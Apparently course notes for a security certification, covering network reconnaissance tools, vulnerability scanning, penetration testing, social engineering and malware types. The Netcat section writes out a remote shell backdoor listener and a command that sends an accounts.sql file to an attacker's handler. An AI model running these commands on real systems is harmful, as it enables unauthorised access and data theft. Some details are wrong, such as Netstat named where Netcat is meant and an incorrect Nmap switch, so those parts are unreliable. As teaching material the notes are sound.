- Protocol: do not assume that a port is being used for its “well known” application protocol. Nmap can scan traffic to verify whether it matches the expected signature.
- Application name and version: the software operating the port, such as Apache web server or Internet Information Services (IIS) web server.
- OS type and version: use the -o switch to enable OS fingerprinting (or -A to use both OS fingerprinting and version discovery).
- Device type: not all network devices are PCs. Nmap can identify switches and routers or other types of networked devices.

Nmap comes with a database of application and version fingerprint signatures, classified using a standard syntax called Common Platform enumeration (CPE). Unmatched responses can be submitted to a web URL for analysis by the community.

Netstat and Nslookup

Basic service discovery tasks can also be performed using tools built into the Windows and Linux operating systems:

- netstat: show the state of TCP/UDP ports on the local machine. The same command can be used on both Windows and Linux, though with different syntax options. Use netstat to check for service misconfigurations. Can also identify suspect remote connections to services on the local host or from the host to remote IP addresses. When attempting to identify malware, the most useful netstat output is to show which process is listening on which ports.
- nslookup/dig: query name records for a given domain using a particular DNS resolver. Under Windows (nslookup) or Linux (nslookup/dig). An attacker may test a network to find out if the DNS service is misconfigured. A misconfigured DNS may allow a zone transfer, which will give the attacker the complete records of every host in the domain, revealing a huge amount about the way the network is configured.

Packet Capture and TCPdump

Packet and protocol analysis is another crucial security assessment and monitoring process:

- Packet analysis refers to deep-down frame-by-frame scrutiny of captured frames.
- Protocol analysis means using statistical tools to analyze a sequence of packets, or packet trace.

Packet and protocol analysis depends on a sniffer tool to capture and decode the frames of data. Network traffic can be captured from a host or from a network segment. Using a host means that only traffic directed at that host is captured. Capturing from a network segment can be performed by a switched port analyzer (SPAN) port (or mirror port). Sniffing can also be performed over a network cable segment by using a test access port (TAP). This means that a device is inserted in the cabling to copy frames passing over it. There are passive and active (powered) versions.

tcpdump is a command line packet capture utility for Linux. The basic syntax of the command is tcpdump -i eth0, where eth0 is the interface to listen on. The utility will then display captured packets until halted manually (Ctrl+C). Frames can be saved to a .pcap file using the -w option. Alternatively, you can open a pcap file using the -r option.

tcpdump is often used with some sort of filter expression to reduce the number of frames that are captured:

- Type: filter by host, net, port, or portrange.
- Direction: filter by source (src) or destination (dst) parameters (host, network, or port).
- Protocol: filter by a named protocol rather than port number (ex. arp, icmp, ip, ip6, tcp, udp)

Filter expressions can be combined by using Boolean operators:

- and (&&)
- or (||)
- not (!)

Filter syntax can be made even detailed by using parentheses to group expressions. A complex filter expression should be enclosed by quotes. For example, the following command filters frames to those with the source IP 10.1.0.100 and destination port 53 or 80.

- tcpdump -i eth0 “src host 10.1.0.100 and (dst port 53 or dst port 80)”


Packet Analysis and Wireshark

A protocol analyzer (or packet analyzer) works in conjunction with a sniffer to perform traffic analysis. You can either analyze a live capture or open a saved capture (.pacp) file. Protocol analyzers can decode a captured frame to reveal its contents in a readable format.

Wireshark is an open-source graphical packet capture and analysis utility, with installer packages for most operating systems. Having chosen the interface to listen on, the output is displayed in a three-pane view. The packet list pane shows a scrolling summary of frames. The packet details pane shows expandable fields in the frame currently selected from the packet list. The packet bytes pane shows the raw data from the frame in hex and ASCII. Wireshark is capable of parsing (interpreting) the headers and payloads of hundreds of network protocols.

Another useful option is to use the Follow TCP Stream context command to reconstruct the packet contents for a TCP session.

Packet Injection and Replay

Some reconnaissance techniques and tests depend on sending forged or spoofed network traffic. Often, network sniffing software libraries allow frames to be inserted (or injected) into the network stream. There are also tools that allow for different kinds of packets to be crafted and manipulated. Well-known tools used for packet injection include Dsniff, Ettercap, Scrappy, and hping.

hping

hping is an open-source spoofing tool that provides a penetration tester with the ability to craft network packets to exploit vulnerable firewalls and IDSs. hping can perform the following types of test:

- Host/port detection and firewall testing: like Nmap, hping can be used to probe IP addresses and TCP/UDP ports for responses.
- Traceroute: if ICMP is blocked on a local network, hping offers alternative ways of mapping out network routes. hping can use arbitrary packet formats, such as probing DNS ports using TCP or UDP, to perform traces.
- Denial of service (DoS): hping can be used to perform flood-based DoS attacks from randomized source IPs. This can be used in a test environment to determine how well a firewall, IDS, or load balancer responds to such attacks.

tcpreplay

Takes previously captured traffic that has been saved to a .pcap file and replays it through a network interface. Optionally, fields in the capture can be changed, such as substituting MAC or IP addresses. tcpreplay is useful for analysis purposes.

Exploitation Frameworks

A remote access trojan (RAT) is malware that gives an adversary the means of remotely accessing the network. From the perspective of security posture assessment, a penetration tester might want to try to establish this sort of connection and attempt to send corporate information over the channel (data exfiltration). If security controls are working properly, this attempt should be defeated (or at least detected).

An exploitation framework uses the vulnerabilities identified by an automated scanner and launches scripts or software to attempt to deliver matching exploits. This might involve considerable disruption to the target, including service failure, and risk data security.

The framework comprises a database of exploit code, each targeting a particular CVE (Common Vulnerabilities and Exposures). The exploit code can be coupled with modular payloads. Depending on the access obtained via the exploit, the payload code may be used to open a command shell, create a user, install software, and so on. The custom exploit module can then be injected into the target system. The framework may also be able to obfuscate the code so that it can be injected past an intrusion detection system or antivirus software.

The best-known exploit framework is Metasploit. The platform is open-source software, now maintained by Rapid7. There is a free framework (command line) community edition with installation packages for Linux and Windows. Rapid7 produces pro and express commercial editions of the framework and it can be closely integrated with the Nexpose vulnerability scanner.

Sn1per is a framework designed for penetration test reporting and evidence gathering. It can integrate with other tools such as Metasploit and Nikto to run automated suites of tests. Results can be displayed as web reports.

Netcat

Netcat (nc) is available for both Windows and Linux. Netcat is a computer networking utility for reading and writing raw data over a network connection, and can be used for port scanning and fingerprinting. 

- echo “head” | nc 10.1.0.1 -v 80

Netstat can also establish connections with remote machines. To configure Netcat as a backdoor, you first set up a listener on the victim system (IP: 10.1.0.1) set to pipe traffic from a program, such as the command interpreter, to its handler:

- nc -l -p 666 -e cmd.exe

The following command connects to the listener and grants access to the terminal:

- nc 10.1.0.1 666

Used the other way around, Netcat can be used to receive files. For example, on the target system the attacker runs the following:

- type accounts.sql | nc 10.1.0.192 6666

On the handler (IP 10.1.0.192), the attacker receives the file using the following command:

- nc -l -p 6666 > accounts.sql

Topic 3B: Explain Security Concerns with General Vulnerability Types

Software Vulnerabilities and Patch Management

Software exploitation means an attack that targets a vulnerability in software code. An application vulnerability is a design flaw that can cause the security system to be circumvented or that will cause the application to crash. Typically, vulnerabilities can only be exploited in quite specific circumstances but because of the complexity of modern software and the speed with which new versions must be released to market, almost no software is free from vulnerabilities.

It is also important to realize that software vulnerabilities affect all types of code, not just applications:

- Operating system (OS): an application exploit will run with the permissions of the logged on user, which will hopefully be limited. A vulnerability in an OS kernel file or shared library is more likely to allow privilege escalation where the malware code runs with higher access rights (system or root).
- Firmware: vulnerabilities can exist in the BIOS/UEFI firmware that controls the boot process for PCs. There can also be bugs in device firmware, such as network cards and disk controllers. Finally, network appliances and Internet of Things (IoT) devices run OS code as a type of firmware.

Zero-Day and Legacy Platform Vulnerabilities

A vulnerability that is exploited before the developer knows about it or can release a patch is called a zero-day. These can be extremely destructive, as it can take the vendor some time to develop a patch, leaving systems vulnerable in the interim.

A legacy platform is one that is no longer supported with security patches by its developer or vendor. By definition legacy platforms are unpatchable. Such systems are highly likely to be vulnerable to exploits and must be protected by security controls other than patching, such as isolating them to networks that an attacker cannot physically connect to.

Impacts from Vulnerabilities

Vulnerabilities can lead to various data breach and data loss scenarios. These events can have serious impacts in terms of costs and damage to the organization’s reputation.

Data Breaches and Data Exfiltration Impacts

All information should be collected, stored, and processed by authenticated users and hosts subject to the permissions (authorization) allocated to them by the data owner. Data breach and data exfiltration describe two types of events where unauthorized information occurs:

- A data breach event is where confidential data is read, transferred, modified, or deleted without authorization. A privacy breach is where personal data is not collected, stored, or processed in full compliance with the laws or regulations governing personal information. A breach can also be described as a data leak. A data breach can be intentional/malicious or unintentional/accidental.
- Data exfiltration is the methods and tools by which an attacker transfers data without authorization from the victim’s systems to an external network or media. Unlike a data breach, a data exfiltration event is always intentional and malicious. A data breach is a consequence of a data exfiltration event.

Identity Theft Impacts

A privacy breach may allow the threat actor to perform identity theft or to sell the data to other malicious actors. The threat actor may obtain account credentials or might be able to use personal details and financial information to make fraudulent credit applications and purchases. 

Data Loss and Availability Loss Impacts

Compared to data breaches, data loss is where information becomes unavailable, either permanently or temporarily. Availability is sometimes overlooked as a security attribute compared to confidentiality and integrity, but it can have severe impacts on business workflows. If processing systems are brought down by accidental or malicious disaster events, a company may not be able to perform crucial workflows like order processing and fulfillment.

Financial and Reputation Impacts

All these impacts can have direct financial impacts due to damages, fines and loss of business. Data/privacy breach and availability loss events will also cause a company’s reputation to drop with direct customers. Major events might cause widespread adverse publicity on social media and mainstream media. In anticipation of these impacts, incident handling teams should include public relations (PR) and marketing expertise to minimize reputational damage.

Topic 3C: Summarize Vulnerability Scanning Techniques

Security Assessments

Network reconnaissance and discovery is used to identify hosts, network topology, and open services/ports, establishing an overall attack surface. Various types of security assessments can be used to test these hosts and services for vulnerabilities. A good starting point is NIST’s Technical Guide to Information Security Testing and Assessment. SP 800-115 identifies three principal activities within an assessment:

- Testing the object under assessment to discover vulnerabilities or to prove the effectiveness of security controls.
- Examining assessment objects to understand the security system and identify any logical weaknesses. This might highlight a lack of security controls or a common misconfiguration.
- Interviewing personnel to gather information and probe attitudes toward and understanding of security.

The main types of security assessment are usually classed as vulnerability assessment, threat hunting, and penetration testing. A vulnerability assessment is an evaluation of a system’s security and ability to meet compliance requirements based on the configuration state of the system. 

Vulnerability Scan Types

An automated scanner must be configured with signatures and scripts that can correlate known software and configuration vulnerabilities with data gathered from each host. Consequently, there are several types of vulnerability scanners optimized for different tasks.

Network Vulnerability Scanner

A network vulnerability scanner, such as Tenable Nessus or Open VAS, is designed to test network hosts, including client PCs, mobile devices, servers, routers, and switches. It examines an organization’s on-premises systems, applications, and devices and compares the scan results to configuration templates plus lists of known vulnerabilities. Typical results from a vulnerability assessment will identify missing patches, deviations from baseline configuration templates, and other related vulnerabilities.

Each scanner is configured with a database of known software and configuration vulnerabilities. The tool compiles a report about each vulnerability in its database that was found to be present on each host. Each identified vulnerability is categorized and assigned an impact warning. Most tools also suggest remediation techniques.

Application and Web Application Scanners

A dedicated application scanner is configured with more detailed and specific scripts to test for known attacks, as well as scanning for missing patches and weak configurations. The best known class of application scanners are web application scanners. Tools such as Nikto look for known web exploits, such as SQL injection and cross-site scripting (XSS), and may also analyze source code and database security to detect un-secure programming practices. 


Common Vulnerabilities and Exposures

An automated scanner needs to be kept up to date with information about known vulnerabilities. This information is often described as a vulnerability feed, though the Nessus tool refers to these feeds as plug-ins, and OpenVAS refers to them as network vulnerability tests (NVTs). Often, the vulnerability feed forms an important part of scan vendors’ commercial models, as the latest updates require a valid subscription to acquire.

Vulnerability feeds make use of common identifiers to facilitate sharing of intelligence data across different platforms. Many vulnerability scanners use the Secure Content Automation Protocol (SCAP) to obtain feed or plug-in updates. SCAP also defines ways to compare the actual configuration of a system to a target-secure baseline plus various systems of common identifiers.

Common Vulnerabilities and Exposures (CVE) is a dictionary of vulnerabilities in published operating systems and applications software. There are several elements that make up a vulnerability’s entry in the CVE:

- An identifier in the format: CVE-YYYY-####, where YYYY is the year the vulnerability was discovered, and #### is the last four digits that indicate the order in which the vulnerability was discovered.
- A brief description of the vulnerability.
- A reference list of URLs that supply more information on the vulnerability.
- The data the vulnerability entry was created.

The CVE dictionary provides the principal input for NIST’s National Vulnerability Database. The NVD supplements the CVE descriptions with additional analysis, a criticality metric, calculated using the Common Vulnerability Scoring System (CVSS), plus fix information.

CVSS is maintained by the Forum of Incident Response and Security Teams. CVSS metrics generate a score from 0 to 10 based on characteristics of the vulnerability, such as whether it can be triggered remotely or needs local access, whether user intervention is required, and so on. The scores are banded into descriptions too:

- 0.1+ = Low
- 4.0+ = Medium
- 7.0+ = High
- 9.0+ = Critical

Intrusive versus Non-Intrusive Scanning

A network vulnerability scanner can be implemented purely as software or as a security appliance, connected to the network. Some scanners work remotely by contacting the target host over the network. Other scanner types use agents installed locally on each host to perform the scanning and transmit a report to a management server.

Scan intrusiveness is a measure of how much the scanner interacts with the target. Non-intrusive (or passive) scanning means analyzing indirect evidence, such as the types of traffic generated by a device. A passive scanner, the Zeek Network Security Monitor being one example, analyzes a network capture and tries to identify policy deviations or CVE matches. 

Active scanning means probing the device’s configuration using some sort of network connection with the target. Active scanning consumes more network bandwidth and runs the risk of crashing the target of the scan or causing some other sort of outage. Agent-based scanning is also an active technique.

The most intrusive type of vulnerability scanner does not stop at detecting a vulnerability. Exploitation frameworks contain default scripts to try to use a vulnerability to run code or otherwise gain access to the system. This type of highly intrusive testing is more typical of penetration testing than automated vulnerability scanning.

Credentialed versus Non-Credentialed Scanning

A non-credentialed scan is one that proceeds by directing test packets at a host without being able to log on to the OS or application. The view obtained is the one that the host exposes to an unprivileged user on the network. 

A credentialed scan is given a user account with logon rights to various hosts, plus whatever other permissions are appropriate for the testing routines. This sort of test allows much more in-depth analysis, especially in detecting when applications or security settings may be misconfigured. It also shows what an insider attack, or one where the attacker has compromised a user account, may be able to achieve. A credentialed scan is a more intrusive type of scan than non-credentialed scanning.

False Positives, False Negatives, and Log Review

A scanning tool will generate a summary report of all vulnerabilities discovered during the scan directly after execution completes. These reports color-code vulnerabilities in terms of their criticality, with red typically denoting a weakness that requires immediate attention. 

Intrusive/active scanning is more likely to detect a wider range of vulnerabilities in host systems and can reduce false positives. A false positive is something that is identified by a scanner or other assessment tool as being a vulnerability, when in fact it is not. 

False negatives are potential vulnerabilities that are not identified in a scan. The risk can be mitigated somewhat by running repeat scans periodically and by using scanners from more than one vendor. Also, because automated scan plug-ins depend on pre-compiled scripts, they do not reproduce the success that a skilled and determined hacker might be capable of and can therefore create a false sense of security.


Reviewing related system and network logs can enhance the vulnerability report validation process. 

Configuration Review

As well as matching known software exploits to the versions of software found running on a network, a vulnerability scan assesses the configuration of security controls and application settings and permissions compared to established benchmarks. It might try to identify whether there is a lack of controls that might be considered necessary or whether there is any misconfiguration of the system that would make controls less effective or ineffective, such as antivirus software not being updated, or management passwords left configured to the default.

Security content automation protocol (SCAP) allows compatible scanners to determine whether a computer meets a configuration baseline. SCAP uses several components to accomplish this function, but some of the most important are:

- Open Vulnerability and Assessment Language (OVAL): an XML schema for describing system security state and querying vulnerability reports and information.
- Extensible Configuration Checklist Description Format (XCCDF): an XML schema for developing and auditing best-practice configuration checklists and rules. Previously, best-practice guides might have been written in prose for system administrators to apply manually. XCCDF provides a machine-readable format that can be applied and validated using compatible software.

Some scanners measure systems and configuration settings against best practice frameworks. This is referred to as a compliance scan. This might be necessary for regulatory compliance or you might voluntarily want to conform to externally agreed standards of best practice.

Threat Hunting

Threat hunting is an assessment technique that utilizes insights gained from threat intelligence to proactively discover whether there is evidence of TTPs already present within the network or system. This contrasts with a reactive process that is only triggered when alert conditions are reported through an incident management system. You can also contrast threat hunting with penetration testing. Where pen test attempts to achieve some sort of system intrusion or concrete demonstration of weakness, threat hunting is based only on analysis of data within the system. To that extent, it is less potentially disruptive than pen testing.

A threat hunting project is likely to be led by senior security analysts, but some general points to observe include:

- Advisories and bulletins: threat hunting is a labor-intensive activity and so needs to be performed with clear goals and resources. Threat hunting usually proceeds according to some hypothesis of possible threat. Security bulletins and advisories from vendors and security researchers about new TTPs and/or vulnerabilities may be the trigger for establishing a threat hunt.

- Intelligence fusion and threat data: threat hunting can be performed by manual analysis of network and log data, but this is a very lengthy process. An organization with a security information and event management (SIEM) and threat analytics platform can apply intelligence fusion techniques. The analytics platform is kept up to date with a TTP and IoC threat data feed. Analysts can develop queries and filters to correlate threat data against on-premises data from network traffic and logs. This process may also be partially or wholly automated using AI-assisted analysis and correlation
- Maneuver: when investigating a suspected live threat, you must remember the adversarial nature of hacking. A capable threat actor is likely to have anticipated the likelihood of threat hunting, and attempted to deploy countermeasures to frustrate detection.

Topic 3D: Explain Penetration Testing Concepts

Penetration Testing

A penetration test, often shortened to pen test, uses authorized hacking techniques to discover exploitable weaknesses in the target’s security systems. Pen testing is also referred to as ethical hacking. A pen test might involve the following steps:

- Verify a threat exists: use surveillance, social engineering, network scanners, and vulnerability assessment tools to identify a vector by which vulnerabilities could be exploited.
- Bypass security controls: look for easy ways to attack the system.
- Actively test security controls: probe controls for configuration weaknesses and errors, such as weak passwords or software vulnerabilities.
- Exploit vulnerabilities: prove that a vulnerability is high risk by exploiting it to gain access to data or install backdoors.

The key difference from passive vulnerability assessment is that an attempt is made to actively test security controls and exploit any vulnerabilities discovered. Pen testing is an intrusive assessment technique.

Rules of Engagement

Security assessments might be performed by employees or may be contracted to consultants or other third parties. Rules of engagement specify what activity is permitted or not permitted. These rules should be made explicit in a contractual agreement. 




Attack Profile

Attacks come from different sources and motivations. You may wish to test both resistance to external (targeted and untargeted) and insider threats. You need to determine how much information about the network to provide to the consultant:

- Black box (or unknown environment): the consultant is given no privileged information about the network and its security systems. This type of test would require the tester to perform a reconnaissance phase. Black box tests are useful for simulating the behavior of an external threat.
- White box (or known environment): the consultant is given complete access to information about the network. This type of test is sometimes conducted as a follow-up to a black box test to fully evaluate flaws discovered during the black box test. The tester skips the reconnaissance phase in this type of test. White box tests are useful for simulating the behavior of a privileged insider threat.
- Gray box (or partially known environment): the consultant is given some information; typically, this would resemble the knowledge of junior or non-IT staff to model particular types of insider threats. This type of test requires partial reconnaissance on the part of the tester. Gray box tests are useful for simulating the behavior of an unprivileged insider threat.

A test where the attacker has no knowledge of the system but where staff are informed that a test will take place is referred to as a blind (or single-blind) test. A test where staff are not made aware that a pen test will take place is referred to as a double-blind test.

Bug Bounty

A bug bounty is a program operated by a software vendor or website operator where rewards are given for reporting vulnerabilities. Where a pen test is performed on a contractual basis, costed by the consultant, a bug bounty program is a way of crowdsourcing detection of vulnerabilities. 

Passive and Active Reconnaissance

Analysis of adversary TTPs has established various “kill chain” models of the way modern cyber-attacks are conducted. A penetration testing engagement will generally use the same sort of techniques.

In the first reconnaissance phase for black box testing, the pen tester establishes a profile of the target of investigation and surveys the attack surface for weaknesses. Reconnaissance activities can be classed as passive or active. Passive reconnaissance is not likely to alert the target of the investigation as it means querying publicly available information. Active reconnaissance has more risk of detection. Active techniques might involve gaining physical access to premises or using scanning tools on the target’s web services and other networks.

Pen Test Attack Life Cycle

In the kill chain attack life cycle, reconnaissance is followed by an initial exploitation phase where a software tool is used to gain some sort of access to the target’s network. This foothold might be accomplished using a phishing email and payload or by obtaining credentials via social engineering. Having gained the foothold, the pen tester can then set about securing and widening access. A number of techniques are required:

- Persistence: the tester’s ability to reconnect to the compromised host and use it as a remote access tool (RAT) or backdoor. To do this, the tester must establish a command and control (C2 or C&C) network to use to control the compromised host, upload additional attack tools, and download exfiltrated data. The connection to the compromised host will typically require a malware executable to run after shut down/log off events and a connection to a network port and the attacker’s IP address to be available.
- Privilege escalation: persistence is followed by further reconnaissance, where the pen tester attempts to map out the internal network and discover the services running on it and accounts configured to access it. Moving within the network or accessing data assets are likely to require higher privilege levels.
- Lateral movement: gaining control over other hosts. This is done partly to discover more opportunities to widen access, partly to identify where valuable data assets might be located, and partly to evade detection. Lateral movement usually involves executing the attack tools over remote process shares or using scripting tools, such as PowerShell
- Pivoting: hosts that hold the most valuable data are not normally able to access external networks directly. If the pen tester achieves a foothold on a perimeter server, a pivot allows them to bypass a network boundary and compromise servers on an inside network. A pivot is normally accomplished using remote access and tunneling protocols, such as SSH, VPN, or remote desktop.
- Actions on Objectives: for a threat actor, this means stealing data from one or more systems. From the perspective of a pen tester, it would be a matter of the scope definition whether this would be attempted. In most cases, it is usually sufficient to show that actions on objectives could be achieved.
- Cleanup: for a threat actor, this means removing evidence of the attack, or at least evidence that could implicate the threat actor. For a pen tester, this phase means removing any backdoors or tools and ensuring that the system is not less secure than the pre-engagement state.









Lesson 4: Identifying Social Engineering and Malware

Topic 4A: Compare and Contrast Social Engineering Techniques

Social Engineering

A prerequisite of many types of attacks is to obtain information about the network and security system. Socal engineering refers to means of either eliciting information from someone or getting them to perform some action for the threat actor. It can also be referred to as “hacking the human.” Typical social engineering intrusion scenarios include:

- An attacker creates an executable file that prompts a network user for their password,, and then records whatever the user inputs. The attacker then emails the executable file to the user with the story that the user must double-click the file and log on to the network again to clear up some logon problems the organization has been experiencing that morning. After the user complies, the attacker now has access to their network credentials.
- An attacker contacts the help desk pretending to be a remote sales representative who needs assistance setting up remote access. Through a series of phone calls, the attacker obtains the name/address of the remote access server and login credentials in addition to phone numbers for remote access and for accessing the organization’s private phone and voice-mail system.
- An attacker triggers a fire alarm and then slips into the building during the confusion and attaches a monitoring device to a network port.

Social Engineering Principles

To be persuasive, social engineering attacks rely on one or more of the following principles.

Familiarity/Liking

One of the basic tools of a social engineer is simply to be affable and likable, and to present the requests they make as completely reasonable and unobjectionable. This approach is relatively low-risk as even if the request is refused, it is less likely to cause suspicion and the social engineer may be able to move on to a different target without being detected.

Consensus/Social Proof

The principle of consensus or social proof refers to the fact that without an explicit instruction to behave in a certain way, many people will act just as they think others would act. A social engineering attack can use this instinct either to persuade the target that to refuse a request would be odd or to exploit polite behavior to slip into a building while someone holds the door for them. 


Authority and Intimidation

Many people find it difficult to refuse a request by someone they perceive as superior in rank or expertise. Social engineers can try to exploit this behavior to intimidate their target by pretending to be a senior executive. An attack might be launched by impersonating someone who would often be deferred to, such as a police officer, judge or doctor. Another technique is using spurious technical arguments and jargon. Social engineering can exploit the fact that few people are willing to admit ignorance. Compared to using a familiarity/liking sort of approach, this sort of adversarial tactic might be riskier to the attacker as there is a greater chance of arousing suspicion and the target reporting the attack attempt.

Scarcity and Urgency

Often also deployed by salespeople, creating a false sense of scarcity or urgency can disturb people’s ordinary decision-making process. The social engineer can try to pressure his or her target by demanding quick response.

Impersonation and Trust

Impersonation simply means pretending to be someone else. Impersonation can use either a consensus/liking or intimidating approach. Impersonation is possible where the target cannot verify the attacker’s identity easily, such as over the phone or via an email message.

The classic impersonation attack is for the social engineer to phone into a department, claim they have to adjust something on the user’s system remotely, and get the user to reveal their password. This specific attack is also referred to as pretexting.

Dumpster Diving and Tailgating

Social engineering includes physical attacks to steal information or gain access.

Dumpster Diving

Dumpster diving refers to combing through an organization’s (or individual’s) garbage to try to find useful documents (or even files stored on discarded removable media).

Tailgating and Piggy Backing

Tailgating is a means of entering a secure area without authorization by following close behind a person that has been allowed to open the door or checkpoint. Piggy backing is a similar situation, but means that the attacker enters a secure area with an employee’s permission. Alternatively, piggy backing may be a means of an insider threat actor to allow access to someone without recording it in the building’s entry log. Another technique is to persuade someone to hold a door open, using an excuse such as “I’ve forgotten my badge/key.”

Identity Fraud and Invoice Scams

Identity fraud is a specific type of impersonation where the attacker uses specific details of someone’s identity. A typical consumer identity fraud is using someone else’s name and address to make a loan application or using stolen credit card details to start a mobile phone contract. Invoice scas are another common type of identity fraud. The fraudster will usually spoof the invoice details of a genuine supplier, but change the bank account number. This might rely on the target not double-checking the account, or it might be combined with a social engineering contact call to convince the target that the account change is genuine.

Apart from eliciting credential information from a user, some other techniques include:

- Credential databases: account details from previous attacks are widely available. An attacker can try to match a target in one of these databases and hope that they have reused a password. The attacker could also leverage third-party sites for impersonation.
- Shoulder surfing: a threat actor can learn a password or PIN (or other secure information) by watching the user type it. Despite the name, the attacker may not have to be in close proximity to the target, they could use high-powered binoculars or CCTV to directly observe the target remotely.
- Lunchtime attacks: most authentication methods are dependent on the physical security of the workstation. If a user leaves a workstation unattended while logged on, an attacker can physically gain access to the system. This is often described as a lunchtime attack. Most operating systems are set to activate a password-protected screen saver after a defined period of no keyboard or mouse activity. Users should also be trained to lock or log off the workstation whenever they leave it unattended.

Phishing, Whaling, and Vishing

Phishing is a combination of social engineering and spoofing. It persuades or tricks the target into interacting with a malicious resource disguised as a trusted one, traditionally using email as the vector. Other types of phishing campaigns use a spoof website set up to imitate a bank or e-commerce site or some other web resources that should be trusted by the target.

There are several phishing variants:

- Spear phishing: a phishing scam where the attacker has some information that makes an individual target more likely to be fooled by the attack. Each phishing message is tailored to address a specific target user. The attacker might know the name of a document that the target is editing, for instance, and send a malicious copy, or the phishing email might show that the attacker knows the recipient’s full name, job title, telephone number, or other details that help convince the target that the communication is genuine.
- Whaling: a spear phishing attack directed specifically against upper levels of management in the organization. Upper management may also be more vulnerable to ordinary phishing attacks because of their reluctance to learn basic security procedures.
- Vishing: a phishing attack conducted through a voice channel. 
- SMiShing: this refers to using short message service (SMS) text as the vector.

Spam, Hoaxes, and Prepending

Unsolicited email, or spam, is used as the vector for many attacks. Threat actors harvest email addresses from marketing lists or databases of historic privacy breaches, or might try to target every email address at a certain company. Mass mail attacks could also be perpetrated over any type of instant messaging or Internet messaging service (SPIM).

Hoaxes, such as security alerts or chain emails, are another common social engineering technique, often combined with phishing attacks. An email alert or web pop-up will claim to have identified some sort of security problem, such as virus infection, and offer a tool to fix the problem. The tool of course will be some sort of Trojan application. 

A phishing or hoax email can be made more convincing by prepending. In an offensive sense, prepending means adding text that appears to have been generated by the mail system.

Pharming and Credential Harvesting

Direct messages to a single contact have quite a high chance of failure. Other social engineering techniques still use spoofed resources, such as fake sites and login pages, but rely on redirection or passive methods to entrap victims.

Pharming

Pharming is a passive means of redirecting users from a legitimate website to a malicious one. Rather than using social engineering techniques to trick the user, pharming relies on corrupting the way the victim’s computer performs Internet name resolution, so that they are redirected from the genuine site to the malicious one.

Typosquatting

Rather than redirection, a threat actor might use typosquatting. This means that the threat actor registers a domain name that is very similar to a real one, such as connptia.org, hoping that users will not notice the difference. These are also referred to as cousin, lookalike, or doppelganger domains. Another technique is to register a hijacked subdomain using the primary domain of a trusted cloud provider.

Watering Hole Attack

A watering hole attack is another passive technique where the threat actor does not have to risk communicating directly with the target. It relies on the circumstance that a group of targets may use an unsecure third-party website.

Credential Harvesting

Within the general realm of phishing and pharming, credential harvesting is a campaign specifically designed to steal account credentials. The attacker may have more interest in selling the database of captured logins than trying to exploit them directly. 

Influence Campaigns

An influence campaign is a major program launched by an adversary with a high level of capability, such as a nation-state actor, terrorist group, or hacktivist group. The goal of an influence campaign is to shift public opinion on some topic. Most high-profile influence campaigns that have been detected target election activity, but actors may use such campaigns to pursue a number of goals. With state actors the concept of soft power refers to using diplomatic and cultural assets to achieve an objective.

Topic 4B: Analyze Indicators of Malware Based Attacks.

Malware Classification

Malways is usually simply defined as software that does something bad, from the perspective of the system owner. Some malware classifications, such as Trojan, virus, and worm, focus on the vector used by the malware. The vector is the method by which the malware executes on a computer and potentially spreads to other network hosts. 

- Viruses and worms: these represent some of the first types of malware and spread without any authorization from the user by being concealed within the executable code of another process.
- Trojan: malware concealed within an installer package for software that appears to be legitimate. This type of malware does not seek any type of consent for installation and is actively designed to operate secretly.
- Potentially unwanted programs (PUPs)/Potentially unwanted applications (PUAs): software installed alongside a package selected by the user or perhaps bundled with a new computer system. Unlike a Trojan, the presence of a PUP is not automatically regarded as malicious. It may have been installed without active consent from a purposefully confusing license agreement. This type of software is sometimes described as grayware rather than malware.

Other classifications are based on the payload delivered by the malware. The payload is an action performed by the malware other than simply replicating or persisting on a host. Examples of payload classifications include spyware, rootkit, remote access Trojan (RAT), and ransomware.




Computer Viruses

A computer virus is a type of malware designed to replicate and spread from computer to computer, usually by “infecting” executable applications or program code. There are several different types of viruses and they are generally classified by the different types of file or media that they infect:

- Non-resident/file infector: the virus is contained within a host executable file and runs with the host process. The virus will try to infect other process images on persistent storage and perform other payload actions. It then passes control back to the host program.
- Memory resident: when the host file is executed, the virus creates a new process for itself in memory. The malicious process remains in memory, even if the host process is terminated.
- Boot: the virus code is written to the disk boot sector or the partition table of a fixed disk or USB media, and executes as a memory resident process when the OS starts or the media is attached to the computer.
- Script and macro viruses: the malware uses the programming features available in local scripting engines for the OS and/or browser, such as PowerShell, Windows Management Instrumentation (WMI), JavaScript, Microsoft Office documents with Visual Basic for Applications (VBA) code enabled, or PDF documents with JavaScript enabled.

The term multipartite is used for viruses that use multiple vectors and polymorphic for viruses that can dynamically change or obfuscate their code to evade detection.

Computer Worms and Fileless Malware

A computer worm is memory-resident malware that can run without user intervention and can replicate over network resources. A worm can execute by exploiting a vulnerability in a process when the user browses a website, runs a vulnerable server application, or is connected to an infected file share.

The primary effect of the first types of computer worms was to rapidly consume network bandwidth as the worm replicated.

The term fileless has gained prominence to refer to modern types of malware. Fileless is not a definitive classification, but it described a collection of common behaviors and techniques:

- Fileless malware does not write its code to disk. The malware uses memory resident techniques to run in its own process, within a host process or dynamic link library (DLL), or within a scripting host. 
- Fileless malware uses lightweight shellcode to achieve a backdoor mechanism on the host. The shellcode is easy to recompile in an obfuscated form to evade detection by scanners It is then able to download additional packages or payloads to achieve the actor’s actions and/or objectives. 
- Fileless malware may use “live off the land” techniques rather than compiled executables to evade detection. 

The terms advanced persistent threat (APT) and advanced volatile threat (AVT) can be used to describe the general class of modern fileless/live off the land malware. Another useful classification is low observable characteristics (LOC) attack. 

Spyware and Keyloggers

Various types of unwanted code and malware perform some level of monitoring:

- Tracking cookies: cookies are plaintext files, not malware, but if browser settings allow third-party cookies, they can be used to record pages visited, search queries, browser metadata, and IP address. Tracking cookies are created by adverts and analytics widgets embedded into many websites.
- Adware: this is a class of PUP/grayware that performs browser reconfigurations, such as allowing tracking cookies, changing default search providers, opening sponsor’s pages at startup, adding bookmarks, and so on. Adware may be installed as a program or as a browser extension/plug-in.
- Spyware: this is malware that can perform adware-like tracking, but also monitor local application activity, take screenshots, and activate recording devices, such as a microphone or webcam. Another spyware technique is to perform DNS redirection to pharming sites.
- A keylogger is spyware that actively attempts to steal confidential information by recording keystrokes. The attacker will usually hope to discover passwords or credit card data.

Backdoors and Remote Access Trojans

Any type of access method to a host that circumvents the usual authentication method and gives the remote user administrative control can be referred to as a backdoor. A remote access trojan (RAT) is backdoor malware that mimics the functionality of legitimate control programs, but is designed specifically to operate covertly. Once the RAT is installed, it allows the threat actor to access the host, upload files, and install software or use “live off the land” techniques to effect further compromises.

A compromised host can be installed with one or more bots. A bot is an automated script or tool that performs some malicious activity. A group of bots that are all under the control of the same malware instance can be manipulated as a botnet by the herder program.

